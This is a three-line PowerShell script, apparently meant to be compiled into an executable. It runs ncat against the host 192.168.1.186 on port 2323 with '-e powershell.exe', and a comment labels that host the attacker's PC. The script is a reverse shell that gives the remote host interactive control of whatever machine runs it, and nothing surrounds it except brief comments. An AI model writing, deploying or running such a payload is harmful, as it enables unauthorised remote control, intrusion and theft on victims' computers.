#This script has to be converted to .exe file
Set-Location 'C:\Users\Public\Documents\nmap\nmap-7.92' #Go to netcat directory
./ncat 192.168.1.186 2323 -e powershell.exe #Connect to attcker PC
